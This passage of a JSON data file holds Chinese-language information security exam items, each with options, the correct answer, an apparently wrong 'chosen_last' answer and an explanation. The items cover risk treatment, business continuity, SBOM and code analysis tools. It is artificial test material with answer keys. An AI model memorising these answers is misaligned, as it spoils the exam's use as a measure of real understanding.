Programs）在資安資產分類中，通常直接歸類在「軟體資產（Software）」而非服務資產。","group_context":null},{"id":"資安題庫A.pdf::36-7-086ef5895fd4d8b9","bank":"A","pdf":"資安題庫A.pdf","qid":"36-7-086ef5895fd4d8b9","page":36,"number":7,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"關於資訊資產盤點作業，下列敘述何者正確？","options":{"A":"資訊資產對組織而言基本上是固定的，所以盤點作業只需進行一次就好，不需定期執行","B":"資訊資產盤點，主要目的之一為釐清資產是否還存在，保管人是否有變動","C":"資訊資產盤點的結果讓各單位自行瞭解即可，不需留下相關紀錄","D":"資訊資產盤點作業發動者必須是資訊單位同仁，相關盤點作業之執行也一定只能由資訊單位同仁執行"},"explanation":"(A) 東西會變，要定期盤；(C) 必須留紀錄應付稽核；(D) 各業務單位 （如財務、人資）最懂自己的資料，必須由各單位自行盤點，資訊單位只是協助。所以只有(B) 釐清存在與保管人變動才是對的。","group_context":null},{"id":"資安題庫A.pdf::37-8-b5a3674903ec615c","bank":"A","pdf":"資安題庫A.pdf","qid":"37-8-b5a3674903ec615c","page":37,"number":8,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"進行資產管理時，下列敘述何者「最」正確？","options":{"A":"資產的分級不需要保持一致作法，所有人可依其需要自行將資訊資產分級","B":"凡是機密資訊，都應以明顯的方式進行標示，以方便識別且不易竊取","C":"資產的例行工作可委派他人執行，但仍由資產擁有者負起責任","D":"組織所有的財產，都應明列在資訊資產清冊上"},"explanation":"責任無法委外 。(C) 主管可以叫助理去備份，但沒備份好出事了，還是主管（Owner）要負責，完全正確！ (A)分級標準必須全公司統一；(B) 標示太明顯反而變成駭客的精準尋寶圖； (D)資訊資產清冊只列與「資訊、資料、IT」相關的財產，辦公桌椅不用列進來。","group_context":null},{"id":"資安題庫A.pdf::38-2-76d22469b900b0cd","bank":"A","pdf":"資安題庫A.pdf","qid":"38-2-76d22469b900b0cd","page":38,"number":2,"multiple":false,"answers":["B"],"chosen_last":["A"],"stem":"關於風險評鑑（Risk Assessment ），下列敘述何者「不」正確？","options":{"A":"風險評鑑可以參考 ISO/IEC 31010:2019","B":"根據風險評鑑的結果，可能有幾種決策：避免、分攤、降低、拒絕等四種處理風險方式","C":"風險評鑑流程可以提供企業一套有系統、可量化的方式進行評估","D":"風險評鑑結果可讓企業決定要對這樣的風險做什麼處置或防護來降低該風險，或降低該風險造成的影響"},"explanation":"資安四大風險處理選項是：降低（降低機率或衝擊）、避免（不做這項業務）、分攤/ 轉移（買保險、委外）、接受（當作成本）。 絕對沒有 「拒絕」風險這回事。","group_context":null},{"id":"資安題庫A.pdf::40-11-f67bef9e864f47ef","bank":"A","pdf":"資安題庫A.pdf","qid":"40-11-f67bef9e864f47ef","page":40,"number":11,"multiple":false,"answers":["D"],"chosen_last":["C"],"stem":"關於風險評鑑管理程式，下列敘述何者較「不」正確？","options":{"A":"建立全景界定風險評鑑範圍","B":"詳細風險評鑑包括風險識別、風險分析與風險評估","C":"風險處理若符合風險處理準則，則進入風險接受階段","D":"風險評鑑若不符合風險評鑑準則，則進入風險溝通階段"},"explanation":"當風險「不符合（即超出）風險評鑑準則」時，代表該風險落在了不可接受的區間，此時的核心任務是進入「風險處理」階段（例如：降低風險、規避風險、轉移風險等），而不是直接切換到風險溝通。 風險處理四大對策( 譬喻：走在路上怕被鳥屎砸到)  風險規避（Avoidance）：待在家不出門。業務直接不做，徹底斷絕發生機會。  風險緩解（Mitigation/Reduction）：出門戴安全帽、撐傘。透過加裝控制措施來降低機率或傷害。  風險分擔/ 轉移（Sharing/Transference ）：去買「鳥屎險」，被砸到理賠 1 萬；或花錢請保鏢幫我撐傘。找保險公司或外包廠商一起扛。  風險保留/ 接受（Retention/Acceptance ）：摸摸鼻子，算了，反正機率很低，被砸到洗頭就好。不做任何處理，自己吞。","group_context":null},{"id":"資安題庫A.pdf::41-2-bca81495c59bbf97","bank":"A","pdf":"資安題庫A.pdf","qid":"41-2-bca81495c59bbf97","page":41,"number":2,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"關於風險處理的敘述，下列何者正確？","options":{"A":"風險可接受準則需先定義清楚，風險評鑑結果超過此準則就必須進行風險處理，以降低風險","B":"風險處理須實施的控制措施，皆必須參考 ISO 27001 的附錄 A","C":"風險處理計畫及殘餘風險的結果，須由資產擁有者確認","D":"風險處理後所剩餘的風險必須為零"},"explanation":"所有的風險計畫與最後承擔多少風險，一定要由負責人（資產擁有者 Asset Owner）簽字確認。(A)超過準則除了降低，也可以選擇規避或轉移；(B)附錄 A 只是參考，可依實務自訂； (D) 世界上沒有絕對的安全，殘餘風險不可能為零。","group_context":null},{"id":"資安題庫A.pdf::42-9-5bc240679431fa64","bank":"A","pdf":"資安題庫A.pdf","qid":"42-9-5bc240679431fa64","page":42,"number":9,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"「商業公司使用防毒和反垃圾郵件機制，以保護公司的電子郵件系統。」請問上述屬於下列何種風險處理對策？","options":{"A":"風險避免（Risk avoidance）","B":"風險保留（Risk retention）","C":"風險修改（Risk modification）","D":"風險分擔（Risk sharing ）"},"explanation":"在最新版 ISO 27005，風險緩解/降低（Mitigation/Reduction）， 官方標準名詞定義為(C)風險修改（Risk modification）—意即透過裝防毒、防垃圾郵件等控制措施，來「修改（降低）」風險的機率或衝擊。","group_context":null},{"id":"資安題庫A.pdf::43-10-1290a2724a8872cb","bank":"A","pdf":"資安題庫A.pdf","qid":"43-10-1290a2724a8872cb","page":43,"number":10,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"關於風險接受（Risk Acceptance），下列敘述何者「不」正確？","options":{"A":"在風險影響與處理對策之間取得平衡，決定組織可接受之風險值","B":"高於可接受的風險值，應優先控管或處理","C":"用於決定是否接受某風險","D":"風險控制措施即是緩解風險的途徑"},"explanation":"風險接受本身就是一種風險處理的「決定 /結果」，而不是用來「決定是否接受風險的工具或評估過程」。我們先透過風險評估與分析，發現某個風險很低、或者處理成本高於損失，最後才做出「接受它」的決定。","group_context":null},{"id":"資安題庫A.pdf::44-3-00e223cbf07cde0a","bank":"A","pdf":"資安題庫A.pdf","qid":"44-3-00e223cbf07cde0a","page":44,"number":3,"multiple":false,"answers":["D"],"chosen_last":["B"],"stem":"某資安人員已經選定「降低個資外洩風險」作為風險處理方式。接著，他需要決定實際要採取哪些資訊安全控制措施。因為公司保存大量客戶個資，所以控制措施必須涵蓋資料存取、資料傳輸、資料保存與異常偵測。下列哪些控制措施較適合用於降低資外洩風險？","options":{"A":"資料分類與標示","B":"存取權限控管","C":"加密保護","D":"DLP 資料外洩防護"},"explanation":"DLP（Data Loss Prevention） 則是直接點名用來阻斷資料私自外傳的「專用機防護方案」，最契合題目「外洩」的防禦手段。","group_context":null},{"id":"資安題庫A.pdf::46-1-f15856c5b1a99f27","bank":"A","pdf":"資安題庫A.pdf","qid":"46-1-f15856c5b1a99f27","page":46,"number":1,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"關於營運持續管理（Business Continuity Management,BCM），下列敘述何者較「不」正確？","options":{"A":"確保組織的利益最大化","B":"確保人員的成本最小化","C":"確保組織在發生重大災害時，業務持續不中斷","D":"確保組織在購併其他產業時，可以迅速的完成"},"explanation":"BCM 的核心目的很純粹，就是為了防範水災、地震、駭客攻擊等大災難。它的目標是讓公司在受災時「核心業務不要中斷」（C 的概念）。 它並不是為瞭解決公司的「利益最大化」、「降低人事成本」或「公司購併」而設計的。","group_context":null},{"id":"資安題庫A.pdf::46-2-1561be711e6a44f2","bank":"A","pdf":"資安題庫A.pdf","qid":"46-2-1561be711e6a44f2","page":46,"number":2,"multiple":false,"answers":["B"],"chosen_last":["D"],"stem":"關於營運持續管理活動，下列何者為正確的順序？ (a)擬定營運持續計畫（BCP）、(b)調整營運持續策略、 (c)營運衝擊分析 （BIA）、(d)定期演練","options":{"A":"abcd","B":"cbad","C":"bacd","D":"acbd"},"explanation":"正確步驟是： (c)BIA（營運衝擊分析）：先分析哪些業務停擺會最痛、損失最大。 (b)調整策略：根據痛點決定應對策略。 (a)擬定 BCP 計畫：寫下具體的應變操作步驟。 (d)定期演練：實際模擬測試，確保計畫真的有用。","group_context":null},{"id":"資安題庫A.pdf::47-2-e23243ff18c89801","bank":"A","pdf":"資安題庫A.pdf","qid":"47-2-e23243ff18c89801","page":47,"number":2,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"關於營運衝擊分析應考慮項目，下列敘述何者「不」正確？","options":{"A":"復原至最低營運程度所需之員工、技能、設施及服務所需之時間","B":"損害程度之等級不包括收入損失、附加成本、商譽損失、喪失競爭優勢等","C":"最低營運程度所需之員工、技能、設施及服務","D":"完全復原至原服務水準所需之員工、技能、設施及服務所需之時間"},"explanation":"既然要分析損害程度，當然必須包括少賺多少錢（收入損失）、商譽變差、失去競爭力等代價。(B)「不包括」是錯誤的。","group_context":null},{"id":"資安題庫A.pdf::47-3-5b6230665fc08d36","bank":"A","pdf":"資安題庫A.pdf","qid":"47-3-5b6230665fc08d36","page":47,"number":3,"multiple":false,"answers":["B"],"chosen_last":["D"],"stem":"在進行營運衝擊分析(Business Impact Analysis,BIA)時，下列三項評估的先後順序為何？ 1. 產品與服務(Products and services) 2. 流程(Processes) 3. 活動(Activities)","options":{"A":"3-\u003e2-\u003e1","B":"1- \u003e2-\u003e3","C":"2-\u003e1- \u003e3","D":"1- \u003e3-\u003e2"},"explanation":"BIA 的評估順序是由大到小、由外而內。先看公司對外提供什麼 1. 產品與服務，再看內部是用什麼 2.流程做出來的，最後看流程中包含哪些具體的 3.活動。","group_context":null},{"id":"資安題庫A.pdf::49-3-e97b069144d49c32","bank":"A","pdf":"資安題庫A.pdf","qid":"49-3-e97b069144d49c32","page":49,"number":3,"multiple":false,"answers":["A"],"chosen_last":["B"],"stem":"• 關於復原時間目標(Recovery Time Objective,RTO)與復原點目標 (Recovery Point Objectives,RPO)，下列敘述何者「不」正確？ o","options":{"A":"RTO 為發生中斷後皆需達到原運作水準所需花費的時間目標 o","B":"RPO 為發生中斷後資料恢復的時間點目標 o","C":"RTO 與中斷時間有關，RPO 與資料遺失區間有關 o","D":"因應 RPO 選用的技術有時也與 RTO 能恢復的時間有關"},"explanation":"災難發生時，RTO 只要求系統能復原到「維持基本運作的最低可接受水準」即可，不需要（也通常沒辦法）立刻恢復到跟原本一模一樣的完美 100 分狀態。","group_context":null},{"id":"資安題庫A.pdf::51-6-183357891c5a0c35","bank":"A","pdf":"資安題庫A.pdf","qid":"51-6-183357891c5a0c35","page":51,"number":6,"multiple":false,"answers":["B"],"chosen_last":["A"],"stem":"關於災害復原計畫（Disaster Response Planning,DRP）之目的，下列敘述何者「不」正確？","options":{"A":"將災害造成的影響減少至最小程度","B":"分析災害、安全缺失和服務損失的後果","C":"採取必要的措施來確保業務能正常執行","D":"回復資訊的完整，並確保資訊系統正常運作"},"explanation":"廚房失火了！你現在啟動的「火災復原計畫（ DRP）」目標應該是： 趕快拿滅火器把火撲滅(A) 、搶救財物(C)、把廚房重新粉刷讓它能繼續開夥(D)。至於「分析當初為什麼會失火、缺失在哪、損失了幾百萬」(B) 是 「事後檢討報告」。救火的當下或計畫目的，不是為了做鑑識分析。","group_context":null},{"id":"資安題庫A.pdf::51-7-20264e0d2808e5c2","bank":"A","pdf":"資安題庫A.pdf","qid":"51-7-20264e0d2808e5c2","page":51,"number":7,"multiple":false,"answers":["B"],"chosen_last":["D"],"stem":"關於營運持續計畫（Business Continuity Plan,BCP）與災難復原計畫（Disaster Recovery Plan,DRP）下列敘述何者正確？","options":{"A":"BCP 與 DRP 的處理程式完全沒有關聯","B":"BCP 較著重於營運能力的恢復","C":"BCP 的資源要求通常較 DRP 為多","D":"DRP 所要求的回復時間較短"},"explanation":"BCP(營運持續)：重點是讓公司生意繼續做。高層宣佈：「所有人改去路易莎咖啡集合，用手機繼續接客、出貨！」（著重營運能力恢復）。 • DRP(災難復原) ：重點是 IT 部門要趕快去把埋在土底下的伺服器挖出來、 把資料倒進雲端、讓系統重新上線。 • 所以，BCP 管的是「生意能不能繼續做」，DRP 管的是「資訊技術跟系統能不能活過來」。","group_context":null},{"id":"資安題庫A.pdf::52-8-351d9dac440f7c6c","bank":"A","pdf":"資安題庫A.pdf","qid":"52-8-351d9dac440f7c6c","page":52,"number":8,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"下列何者「不」屬於復原程式之項目？","options":{"A":"於備援設備中安裝作業系統與應用程式","B":"於復原系統重新載入備份資料","C":"復原系統上線後重新評估災害發生風險","D":"測試復原系統功能是否正常"},"explanation":"手機掉到馬桶裡壞了，你現在正在執行「手機復原程式」：買一支新手機(A)、從 iCloud 把相片回復回來(B)、開機測試看看能不能正常操作 (D)。等手機完全修好、可以正常使用過了一週後，你坐在沙發上心想： 「下次去廁所時不要帶手機好了，免得又掉下去。」這種重新評估風險(C) 是屬於「長期風險管理」，不屬於急救復原程式（恢復當下）的範圍。","group_context":null},{"id":"資安題庫A.pdf::52-9-4c1c5342205589c6","bank":"A","pdf":"資安題庫A.pdf","qid":"52-9-4c1c5342205589c6","page":52,"number":9,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"公司採單次回復方式建立熱備援測試站點，並定期進行災害復原計畫測試，每次測試完成後，在離開測試的熱備援站點前，應先確定下列何項活動？","options":{"A":"執行管理審查會議，提供測試建議報告給供應商","B":"確定測試中殘餘的風險與需修正的步驟","C":"清理熱備援站點內公司的所有測試資料","D":"執行根本原因分析，確定測試評估報告"},"explanation":"你租了一間共用辦公室來模擬「秘密研發新產品」。開完會、演練完準備退租離開時，第一件最重要的事情是什麼？當然是把白板上的機密擦乾淨、把桌上的商業機密檔全部帶走或碎掉(C) ！要是把公司的測試資料留在別人的租賃站點，那不就變成嚴重的資安外洩了。","group_context":null},{"id":"資安題庫A.pdf::54-1-87105f67005e101d","bank":"A","pdf":"資安題庫A.pdf","qid":"54-1-87105f67005e101d","page":54,"number":1,"multiple":false,"answers":["B"],"chosen_last":["A"],"stem":"關於軟體組成分析（Software Composition Analysis, SCA ），下列敘述何者「不」正確？","options":{"A":"可透過分析來識別所使用協力廠商/開源軟體，其所存在的風險或威脅","B":"「軟體組成分析」為源碼檢測其一類型，主要分析軟體是否存在開發語法缺陷","C":"所分析的風險因數包括，如：元件過期、已知弱點、程式庫信任、軟體授權等","D":"「軟體透明度」能提升分析準確性，可透過如 SBOM 標準來發佈與交換資訊"},"explanation":"(B選項錯誤) 軟體組成分析（SCA ）的重點在於「清點成分(元件)」。引用了哪些現成的協力廠商開源套件及法律授權問題。「分析程式碼有沒有寫錯、有沒有語法缺陷（比如打錯字或邏輯漏洞）」是靜態原始碼掃描（SAST/白箱測試）的工作，不是 SCA 的主要職責。","group_context":null},{"id":"資安題庫A.pdf::55-1-1a0464bdaa1a1820","bank":"A","pdf":"資安題庫A.pdf","qid":"55-1-1a0464bdaa1a1820","page":55,"number":1,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"面對日益嚴峻的軟體供應鏈攻擊（如 Log4j 事件），企業欲建立快速識別受駭資產的能力。下列何項機制最有效地協助組織在漏洞揭露當下，精準定位內部系統是否使用了含有漏洞的協力廠商元件？","options":{"A":"定期執行外部弱點掃描（Vulnerability Scanning）","B":"建立並維護軟體物料清單（SBOM ）","C":"要求供應商提供每季一次的滲透測試報告","D":"在所有伺服器上安裝主機型入侵偵測系統（HIDS）"},"explanation":"(B)只要去翻庫存檔案裡，每個產品附帶的 SBOM（軟體成分表）。 直接用關鍵字搜尋有沒有「Log4j」這個成分，一秒鐘就能精準定位受災範圍，速度最快。(A)的掃描是從外面敲門測試，不一定能深入結構內部查到被埋在好幾層底下的開源套件弱點。","group_context":null},{"id":"資安題庫A.pdf::56-1-082d97b5c299ba04","bank":"A","pdf":"資安題庫A.pdf","qid":"56-1-082d97b5c299ba04","page":56,"number":1,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"A 公司之客戶某金融機構係屬公務機關，其「資訊交換系統」之運作涉及國家機密資訊，故 A 公司執行本「資訊交換系統」開發與維護之相關人員， 依《資通安全管理法實行細則》規定「受託業務涉及國家機密者，執行受託業務之相關人員應接受適任性查核，並依國家機密保護法之規定，管制其出境。」， 請問有關適任性查核事項內容之說明，下列項目何者錯誤？","options":{"A":"曾任公務員，因違反相關安全保密規定受懲戒或記過以上行政懲處","B":"曾任公務員，因違反相關安全保密規定受懲戒或警告以上行政懲處","C":"曾犯洩密罪，或於動員戡亂時期終止後，犯內亂罪、外患罪，經判刑確定","D":"曾犯洩密罪，或於動員戡亂時期終止後，犯內亂罪、外患罪，通緝有案尚未結案"},"explanation":"題庫未提供解析","group_context":null},{"id":"資安題庫A.pdf::57-1-4c629a26d7d68b92","bank":"A","pdf":"資安題庫A.pdf","qid":"57-1-4c629a26d7d68b92","page":57,"number":1,"multiple":false,"answers":["D"],"chosen_last":["B"],"stem":"下面何項「不」是源碼檢測工具？","options":{"A":"SonarQube","B":"Checkmarx","C":"Fortify","D":"Nexpose"},"explanation":"Nexpose 像是「大樓的安全警衛」，不看你的草稿，而是去巡邏整棟大樓（伺服器、網路），看看哪扇窗戶沒關、哪道門鎖壞了（漏洞掃描）。","group_context":null},{"id":"資安題庫A.pdf::57-1-d8ef2c8578b29cd5","bank":"A","pdf":"資安題庫A.pdf","qid":"57-1-d8ef2c8578b29cd5","page":57,"number":1,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"程式碼簽署(Code Signing)無法提供以下哪一項功能？","options":{"A":"確認軟體開發者的身份","B":"防止程式碼被篡改","C":"用戶端認證","D":"程式碼執行時期的合法性識別"},"explanation":"程式碼簽署就像是「商品的防偽雷射標籤與廠商蓋章」，用來向消費者證明這台冷氣是原廠出的（A ）、中途沒有被偷偷拆開改裝過（B 、 D）。它無法用來「認證買冷氣的客戶是誰（用戶端認證）」，因為標籤是貼在產品上，而不是貼在客戶額頭上。","group_context":null},{"id":"資安題庫A.pdf::57-2-10c5c45e8fca5fbb","bank":"A","pdf":"資安題庫A.pdf","qid":"57-2-10c5c45e8fca5fbb","page":57,"number":2,"multiple":false,"answers":["D"],"chosen_last":["C"],"stem":"關於源碼檢測的敘述，下列何者錯誤？","options":{"A":"又稱靜態應用程式安全測試（Static Application Security Testing， SAST）","B":"在安全系統發展生命週期（SSDLC ）中，源碼檢測也是其中一項重要安全設計流程之一","C":"主要目的是找出軟體程式碼中的安全問題或漏洞，這種測試通常在軟體的開發和維護階段進行","D":"OWASP ZAP 是常見源碼檢測工具之一"},"explanation":"源碼檢測是「靜態的（不把程式執行起來，直接看程式碼）」。 OWASP ZAP 是一款動態測試（ DAST）工具。這就像是「買車時的實際試踩油門、撞擊測試」，必須要把車子發動（程式跑起來）才能測試，而不是只坐在辦公室看汽車設計圖。","group_context":null},{"id":"資安題庫A.pdf::58-2-3836f89a8d73bcee","bank":"A","pdf":"資安題庫A.pdf","qid":"58-2-3836f89a8d73bcee","page":58,"number":2,"multiple":false,"answers":["D"],"chosen_last":["A"],"stem":"下列對行動碼(Mobile code)，下列敘述何者不正確？","options":{"A":"通常不具傷害性","B":"可在不同作業系統之間執行","C":"可在不同瀏覽器上順利執行","D":"無法從遠端系統傳到本地端執行"},"explanation":"「行動碼（Mobile Code ）」最常見的就是網頁裡的 JavaScript。 它就像是「餐廳給你的即食泡麵包」，是從伺服器（遠端）傳到你的手機/ 電腦（本地端）才當場泡開執行的。","group_context":null},{"id":"資安題庫A.pdf::58-5-07c6418aa46a228b","bank":"A","pdf":"資安題庫A.pdf","qid":"58-5-07c6418aa46a228b","page":58,"number":5,"multiple":false,"answers":["A"],"chosen_last":["D"],"stem":"關於逆向工程，下列敘述何者正確？","options":{"A":"從組合語言恢復高階語言的結構與語法過程","B":"從機器語言恢復高階語言的結構與語法過程","C":"從高階語言恢復組合語言的結構與語法過程","D":"從高階語言恢復機器語言的結構與語法過程"},"explanation":"正向工程（寫程式）：人類寫得懂的話（高階語言）變成電腦懂的 0101（機器語言/組合語言）。逆向工程：就像「把做好的蛋糕（組合語言 /機器碼），想辦法還原出當初的食譜密方（高階語言）」。(B)機器語言 （0 與 1）要直接一步跳回高階語言難度極高，實務上通常是先將機器碼反組譯成「組合語言」，再從組合語言恢復成「高階語言」，因此( A)是最核心且精確的逆向工程定義。","group_context":null},{"id":"資安題庫A.pdf::59-6-7f6f47de8eb76f9b","bank":"A","pdf":"資安題庫A.pdf","qid":"59-6-7f6f47de8eb76f9b","page":59,"number":6,"multiple":false,"answers":["D"],"chosen_last":["C"],"stem":"下列何者較「不」是在軟體逆向工程動態分析時會使用到的手法？","options":{"A":"設定中斷點","B":"顯示堆疊 (stack)內容","C":"單步執行","D":"程式碼重構"},"explanation":"動態分析就像「當場盯著嫌犯的一舉一動 」。我可以叫他走到一半罰站（中斷點 A）、看他身上口袋裝了什麼（顯示堆疊 B）、叫他走一步我看一步（單步執行 C）。程式碼重構（D ）是「把混亂的程式碼重新寫得漂亮、好讀」，這是開發或整理程式時在做的，不是拿來分析惡意軟體的動態手法。","group_context":null},{"id":"資安題庫A.pdf::59-9-f70c0be112a12811","bank":"A","pdf":"資安題庫A.pdf","qid":"59-9-f70c0be112a12811","page":59,"number":9,"multiple":false,"answers":["A"],"chosen_last":["C"],"stem":"關於程式碼，下列敘述何者「不」正確？ String firstname = req.getParameter(\"firstname\"); String lastname = req.getParameter(\"lastname\"); // FIXME: do your own validation to detect attacks String query = \"SELECT id, firstname, lastname FROM authors WHERE forename = ? and surname = ?\";PreparedStatement pstmt = connection.prepareStatement( query ); pstmt.setString( 1, firstname ); pstmt.setString( 2, lastname ); try { ResultSet results = pstmt.execute(); }","options":{"A":"Hard-coded Password 為 FIXME","B":"此程式碼語言為 Java","C":"prepareStatement 為預存式查詢","D":"setString 為參數化查詢"},"explanation":"String firstname = req.getParameter(\"firstname\"); String lastname = req.getParameter(\"lastname\"); #這兩行程式碼負責從網頁前端（使用者填寫的表單或網址參數）撈取資料，並分別存入firstname與lastname這兩個字串變數中。 // FIXME: do your own validation to detect attacks (A 選項錯誤) #這是一行註解（Comment）。FIXME 是開發者常用的標記，意思是「請在這邊加上你自己的驗證機制以偵測攻擊」。它不是 Hard-coded Password（寫死的密碼）。 String query = \"SELECT id, firstname, lastname FROM authors WHERE forename = ? and surname = ?\";PreparedStatement pstmt = connection.prepareStatement( query ); pstmt.setString( 1, firstname ); pstmt.setString( 2, lastname ); try { ResultSet results = pstmt.execute(); } ?（佔位符）：在SQL 指令中，工程師沒有直接把firstname串接進去，而是放了兩個?符號。 PreparedStatement（預存程式/預編譯陳述式）：資料庫會先將這行帶有?的SQL 指令拿去「編譯」，確認好這條指令的結構就是「去authors 表格查資料」，欄位寬度跟功能已經固定，無法再被改變。 setString(1, firstname)：把剛剛抓到的變數，當成純粹的「參數」塞進第一個? ， 這在 Java 裡是標準用來防範 SQL 注入攻擊的參數化查詢（預存式查詢） 安全寫法。","group_context":null},{"id":"資安題庫A.pdf::60-10-0133fab626499c21","bank":"A","pdf":"資安題庫A.pdf","qid":"60-10-0133fab626499c21","page":60,"number":10,"multiple":false,"answers":["A"],"chosen_last":["C"],"stem":"你受聘於一個公司進行源碼檢測，需確認程式碼中是否隱藏潛在的惡意行為或漏洞。經分析發現，x() 函數對輸入執行了某種操作，並透過字串反轉進行額外處理。下列何項最正確地描述該程式碼的功能具有潛在風險？ def x(a): b = \"\".join([chr(ord(c)^ 0x42)for c in a]) return b[::- 1] def main(): s = \"SYP{txf_ofq}\" t = x(s) if t == \"}afq{noT_SPY\": print(\"Access Granted\") else: print(\"Access Denied\") main()","options":{"A":"程式碼使用一種簡單 XOR 加密，有容易被破解的風險","B":"程式碼包含難以追蹤的邏輯漏洞，可能被用於後門驗證邏輯","C":"程式碼進行了無法逆向的加密方式，無法直接解密字串 SYP{txf_ofq} |","D":"程式碼邏輯錯誤，t 的結果永遠無法等於\"}afq{noT_SPY\""},"explanation":"題目中的 x(a)函數裡寫了 ^ 0x42。這個^ 在程式裡代表 XOR（互斥或）運算。 這種加密非常簡單，只要駭客拿到密文，用同樣的數字再計算一次就能直接還原出原本的明文。在現代資安資產中，這種簡單的加密極易被秒破，藏有巨大的安全風險。","group_context":null},{"id":"資安題庫A.pdf::61-3-959fae18fc147916","bank":"A","pdf":"資安題庫A.pdf","qid":"61-3-959fae18fc147916","page":61,"number":3,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"關於黑箱測試（Black- Box Testing），下列敘述何者正確？","options":{"A":"更容易鑑別出軟體問題的根因","B":"更容易發現邏輯性缺失","C":"更容易鑑別出軟體部署後的問題","D":"可測試程式碼涵蓋範圍更大"},"explanation":"「黑箱測試」 就像是你去買一台新車，你在完全不拆開引擎（看不到內部程式碼）的前提下，坐在駕駛座實際踩油門、踩煞車（從外部介面輸入資料），來看這台車有沒有反應。(C)因為黑箱測試是把軟體當成一個完整的成品來敲敲看，所以它最容易發現軟體「部署上線後」，在實際環境運作時外部介面有沒有問題（例如：按鈕按了沒反應、網頁連不上）。 (A)、(B)、 (D)都是「白箱測試（看得到內部程式碼）」的優點。看得到代碼才容易抓到程式碼寫錯的根因（A）與程式碼涵蓋率（D）。","group_context":null},{"id":"資安題庫A.pdf::62-5-de672402c8cf0289","bank":"A","pdf":"資安題庫A.pdf","qid":"62-5-de672402c8cf0289","page":62,"number":5,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"從 Microsoft 安全性開發週期（Secure Development Life, SDL ） 的觀點，靜態程式分析（Static Analysis）主要是下列何項階段的考量？","options":{"A":"需求階段（Requirements）","B":"設計階段（Design）","C":"實作階段（Implementation）","D":"分析階段（Analysis ）"},"explanation":"靜態程式分析 (俗稱白箱掃描) 就是用工具去一頁一頁檢查工程師剛寫好的「程式碼（Source Code ）」裡面有沒有錯，前提就是工程師必須 「已經把程式碼寫出來」。在微軟 SDL 生命週期中，動手寫程式的階段就叫做(C)實作階段（Implementation）。","group_context":null},{"id":"資安題庫A.pdf::63-3-869bf2a1b9284bb8","bank":"A","pdf":"資安題庫A.pdf","qid":"63-3-869bf2a1b9284bb8","page":63,"number":3,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"在調查使用動態主機設定協定（DHCP）分配 IP 位址的網路時，應在何處查看並確定哪種媒體存取控制位址（MAC Address ）在特定時間具有特定的 IP 位址？","options":{"A":"在個人電腦的位址解析協定（ ARP）緩存上","B":"在 Web 伺服器日誌文件中","C":"在 DHCP 伺服器日誌文件中","D":"沒有辦法確定具體的 IP 地址"},"explanation":"DHCP 伺服器就像是「飯店櫃檯的房卡發放處」。每位客人的手機 （MAC 位址）來辦理入住時，櫃檯就會隨機分派一個房間號碼（IP 位址） 給他。想查昨天下午 2 點是誰住在 302 號房（哪個 MAC 拿到哪個 IP）， 最準確的方式就是直接去翻「櫃檯的登記簿（DHCP 伺服器日誌）」。","group_context":null},{"id":"資安題庫A.pdf::64-4-bee6c604bdb210cf","bank":"A","pdf":"資安題庫A.pdf","qid":"64-4-bee6c604bdb210cf","page":64,"number":4,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"關於日誌管理，下列敘述何者較正確？","options":{"A":"日誌應正規化再留存，以利日後分析查閱使用","B":"日誌不應壓縮留存，確保內容正確未遭受破壞","C":"日誌應確保其「不可否認性」，透過日誌傳送協議（如：Syslog）至協力廠商單位即時儲存，可降低竄改風險","D":"日誌種類繁雜並佔用大量儲存空間，分散儲存於服務主機中為最佳實務"},"explanation":"(A 選項錯誤) 日誌管理最佳實務，應以「原始格式（Raw log ）」先進行安全儲存（確保其完整性與法律效力），之後在匯入日誌分析系統 （如 SIEM、ELK）時才進行正規化與解析（ Parsing）。如果直接修改或僅留存正規化後的日誌，可能會因格式轉換而遺失原始欄位或證據力。 (B 選項錯誤)日誌佔用的空間極大，可以且應當進行壓縮與加密留存。壓縮並不會破壞內容，通常還會搭配雜湊值（Hash，如 SHA-256）與數位簽章來確保日誌在壓縮與傳輸過程中「未遭受破壞（完整性）」。 (D 選項錯誤))駭客攻破某台主機後，第一件事就是把那台主機上的 Log 刪光光。所以資安最佳實務一定是「集中化儲存」（把 Log 即時傳到另一台獨立安全的 Log 伺服器鎖起來）。 • (C)正確：為了確保日誌的「不可否認性（Non-repudiation）」，避免駭客入侵主機後刪除或竄改本機日誌，最安全的做法是即時（Real -time）將日誌傳送到外部的獨立第三方日誌伺服器（Syslog Server）或 SIEM 系統。這樣一來，即使本地端主機被攻破，已被傳送出去的日誌也無法被輕易竄改，能有效保全證據。","group_context":null},{"id":"資安題庫A.pdf::65-1-9861449851ea946f","bank":"A","pdf":"資安題庫A.pdf","qid":"65-1-9861449851ea946f","page":65,"number":1,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"請問對公司內的不同網路、系統的時間同步(Clock Synchronization)機制，下列敘述何者最正確？","options":{"A":"系統才需進行時間同步，網路設備不需要","B":"由單一主機對外部時間源進行校正後，所有系統、設備與該主機同步","C":"同網段的所有系統設備，應向同一外部主機進行時間校正，不同網段則分別對外部不同時間源進行校正","D":"不同系統、設備，應分別向外部不同時間源進行時間校正，以分散風險並做比較"},"explanation":"為了不要讓每台伺服器都自己對外連到網路去校時（增加被攻擊的視窗），企業內部會架設一台專屬的 NTP 伺服器，由它統一去跟國家標準時間對時，然後內部所有的電腦、路由器通通跟這台 NTP 